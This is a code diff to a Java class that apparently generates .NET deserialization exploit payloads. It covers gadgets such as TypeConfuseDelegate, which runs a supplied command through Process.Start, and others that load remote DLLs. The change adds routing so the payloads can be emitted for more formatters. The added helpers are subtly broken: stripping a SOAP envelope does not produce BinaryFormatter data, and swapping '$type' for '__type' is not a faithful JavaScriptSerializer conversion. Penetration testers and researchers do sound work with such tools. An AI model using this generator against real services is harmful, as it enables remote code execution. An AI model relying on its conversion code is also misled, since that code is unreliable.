@@ -1038,6 +1038,22 @@ public final class DotNetPayloads {
     private static final Map<String, String> GADGETS = new LinkedHashMap<>();
     private static final Map<String, List<String>> GADGET_FORMATTERS = new LinkedHashMap<>();
 
+    // Category sets — determines which format conversions are valid
+    private static final Set<String> SOAP_NATIVE = Set.of(
+        "TypeConfuseDelegate", "TypeConfuseDelegateMono", "TextFormattingRunProperties",
+        "ActivitySurrogate", "ActivitySurrogateDisableTypeCheck", "ActivitySurrogateSelectorFromFile",
+        "SessionViewStateHistoryItem", "AxHostState", "ToolboxItemContainer",
+        "ResourceSet", "ObjRef", "DataSet", "XamlAssemblyLoadFromFile", "TransactionManagerReenlist"
+    );
+    private static final Set<String> BINARY_NATIVE = Set.of(
+        "ClaimsIdentity", "ClaimsPrincipal", "WindowsIdentity", "WindowsPrincipal",
+        "WindowsClaimsIdentity", "SessionSecurityToken", "RolePrincipal", "GenericPrincipal"
+    );
+    private static final Set<String> JSON_NATIVE = Set.of(
+        "GetterSettingsPropertyValue", "GetterSecurityException", "GetterCompilerResults",
+        "XamlImageInfo", "BaseActivationFactory"
+    );
+
     static {
         GADGETS.put("TypeConfuseDelegate", "Process.Start via TypeConfuseDelegate (SoapFormatter)");
         GADGETS.put("TypeConfuseDelegateMono", "TypeConfuseDelegate tweaked for Mono runtime");
@@ -1072,41 +1088,50 @@ public final class DotNetPayloads {
         GADGETS.put("BaseActivationFactory", "Remote DLL loading for .NET 5/6/7 with WPF");
         GADGETS.put("TransactionManagerReenlist", "TransactionManager.Reenlist method payload");
 
-        GADGET_FORMATTERS.put("TypeConfuseDelegate", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("TypeConfuseDelegateMono", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("TextFormattingRunProperties", List.of("SoapFormatter"));
+        // SOAP-native gadgets → SoapFormatter (native) + BinaryFormatter (stripped envelope)
+        GADGET_FORMATTERS.put("TypeConfuseDelegate", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("TypeConfuseDelegateMono", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("TextFormattingRunProperties", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("ActivitySurrogate", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("ActivitySurrogateDisableTypeCheck", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("ActivitySurrogateSelectorFromFile", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("SessionViewStateHistoryItem", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("AxHostState", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("ToolboxItemContainer", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("ResourceSet", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("ObjRef", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("DataSet", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("XamlAssemblyLoadFromFile", List.of("SoapFormatter", "BinaryFormatter"));
+        GADGET_FORMATTERS.put("TransactionManagerReenlist", List.of("SoapFormatter", "BinaryFormatter"));
+
+        // Binary-native gadgets → BinaryFormatter (native) + SoapFormatter (wrapped in envelope)
+        GADGET_FORMATTERS.put("ClaimsIdentity", List.of("BinaryFormatter", "SoapFormatter"));
+        GADGET_FORMATTERS.put("ClaimsPrincipal", List.of("BinaryFormatter", "SoapFormatter"));
+        GADGET_FORMATTERS.put("WindowsIdentity", List.of("BinaryFormatter", "SoapFormatter"));
+        GADGET_FORMATTERS.put("WindowsPrincipal", List.of("BinaryFormatter", "SoapFormatter"));
+        GADGET_FORMATTERS.put("WindowsClaimsIdentity", List.of("BinaryFormatter", "SoapFormatter"));
+        GADGET_FORMATTERS.put("SessionSecurityToken", List.of("BinaryFormatter", "SoapFormatter"));
+        GADGET_FORMATTERS.put("RolePrincipal", List.of("BinaryFormatter", "SoapFormatter"));
+        GADGET_FORMATTERS.put("GenericPrincipal", List.of("BinaryFormatter", "SoapFormatter"));
+
+        // Raw gadgets — single formatter only
         GADGET_FORMATTERS.put("PSObject", List.of("Raw"));
-        GADGET_FORMATTERS.put("ActivitySurrogate", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("ActivitySurrogateDisableTypeCheck", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("ActivitySurrogateSelectorFromFile", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("ClaimsIdentity", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("ClaimsPrincipal", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("WindowsIdentity", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("WindowsPrincipal", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("WindowsClaimsIdentity", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("SessionSecurityToken", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("SessionViewStateHistoryItem", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("RolePrincipal", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("GenericPrincipal", List.of("BinaryFormatter"));
-        GADGET_FORMATTERS.put("AxHostState", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("ToolboxItemContainer", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("ResourceSet", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("ObjRef", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("DataSet", List.of("SoapFormatter"));
         GADGET_FORMATTERS.put("DataSetOldBehaviour", List.of("Raw"));
         GADGET_FORMATTERS.put("DataSetOldBehaviourFromFile", List.of("Raw"));
         GADGET_FORMATTERS.put("DataSetTypeSpoofing", List.of("Raw"));
+
+        // ObjectDataProvider — 8 formatters (unchanged)
         GADGET_FORMATTERS.put("ObjectDataProvider", List.of(
                 "SoapFormatter", "Json.Net", "JavaScriptSerializer",
                 "DataContractJsonSerializer", "XmlSerializer",
                 "NetDataContractSerializer", "DataContractSerializer", "Raw"));
-        GADGET_FORMATTERS.put("GetterSettingsPropertyValue", List.of("Json.Net"));
-        GADGET_FORMATTERS.put("GetterSecurityException", List.of("Json.Net"));
-        GADGET_FORMATTERS.put("GetterCompilerResults", List.of("Json.Net"));
-        GADGET_FORMATTERS.put("XamlAssemblyLoadFromFile", List.of("SoapFormatter"));
-        GADGET_FORMATTERS.put("XamlImageInfo", List.of("Json.Net"));
-        GADGET_FORMATTERS.put("BaseActivationFactory", List.of("Json.Net"));
-        GADGET_FORMATTERS.put("TransactionManagerReenlist", List.of("SoapFormatter"));
+
+        // Json-native gadgets → Json.Net (native) + JavaScriptSerializer (__type conversion)
+        GADGET_FORMATTERS.put("GetterSettingsPropertyValue", List.of("Json.Net", "JavaScriptSerializer"));
+        GADGET_FORMATTERS.put("GetterSecurityException", List.of("Json.Net", "JavaScriptSerializer"));
+        GADGET_FORMATTERS.put("GetterCompilerResults", List.of("Json.Net", "JavaScriptSerializer"));
+        GADGET_FORMATTERS.put("XamlImageInfo", List.of("Json.Net", "JavaScriptSerializer"));
+        GADGET_FORMATTERS.put("BaseActivationFactory", List.of("Json.Net", "JavaScriptSerializer"));
     }
 
     /** Returns gadget name → description map for the Gadget dropdown. */
@@ -1138,7 +1163,73 @@ public final class DotNetPayloads {
             };
         }
 
-        // All other gadgets have a single formatter — use existing generator
-        return generate(gadget, command);
+        // Get native payload from the existing generator
+        byte[] nativePayload = generate(gadget, command);
+
+        // Route format conversion based on gadget category
+        if (SOAP_NATIVE.contains(gadget)) {
+            return switch (formatter) {
+                case "SoapFormatter"   -> nativePayload;
+                case "BinaryFormatter" -> soapToBinaryFormatter(nativePayload);
+                default -> throw new IllegalArgumentException(
+                        "Unsupported formatter '" + formatter + "' for SOAP-native gadget " + gadget);
+            };
+        } else if (BINARY_NATIVE.contains(gadget)) {
+            return switch (formatter) {
+                case "BinaryFormatter" -> nativePayload;
+                case "SoapFormatter"   -> binaryToSoapFormatter(nativePayload);
+                default -> throw new IllegalArgumentException(
+                        "Unsupported formatter '" + formatter + "' for Binary-native gadget " + gadget);
+            };
+        } else if (JSON_NATIVE.contains(gadget)) {
+            return switch (formatter) {
+                case "Json.Net"             -> nativePayload;
+                case "JavaScriptSerializer" -> jsonNetToJavaScriptSerializer(nativePayload);
+                default -> throw new IllegalArgumentException(
+                        "Unsupported formatter '" + formatter + "' for JSON-native gadget " + gadget);
+            };
+        }
+
+        // Raw or uncategorized — return native payload as-is
+        return nativePayload;
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  Format Conversion Helpers
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /** Strip SOAP envelope → compact inner XML (BinaryFormatter representation). */
+    private static byte[] soapToBinaryFormatter(byte[] soapPayload) {
+        String soap = new String(soapPayload, StandardCharsets.UTF_8);
+        int start = soap.indexOf("<SOAP-ENV:Body>");
+        int end = soap.indexOf("</SOAP-ENV:Body>");
+        if (start >= 0 && end > start) {
+            String inner = soap.substring(start + "<SOAP-ENV:Body>".length(), end).trim();
+            return inner.getBytes(StandardCharsets.UTF_8);
+        }
+        return soapPayload; // fallback: return as-is
+    }
+
+    /** Wrap plain XML in a SOAP envelope (SoapFormatter representation). */
+    private static byte[] binaryToSoapFormatter(byte[] xmlPayload) {
+        String xml = new String(xmlPayload, StandardCharsets.UTF_8);
+        String soap =
+            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
+            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
+            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
+            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
+            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
+            "<SOAP-ENV:Body>" + xml + "</SOAP-ENV:Body>" +
+            "</SOAP-ENV:Envelope>";
+        return soap.getBytes(StandardCharsets.UTF_8);
+    }
+
+    /** Convert Json.Net ($type) JSON to JavaScriptSerializer (__type) format. */
+    private static byte[] jsonNetToJavaScriptSerializer(byte[] jsonPayload) {
+        String json = new String(jsonPayload, StandardCharsets.UTF_8);
+        json = json.replace("\"$type\":", "\"__type\":");
+        json = json.replace("\"$value\":", "\"value\":");
+        json = json.replace("\"$values\":", "\"values\":");
+        return json.getBytes(StandardCharsets.UTF_8);
     }
 }
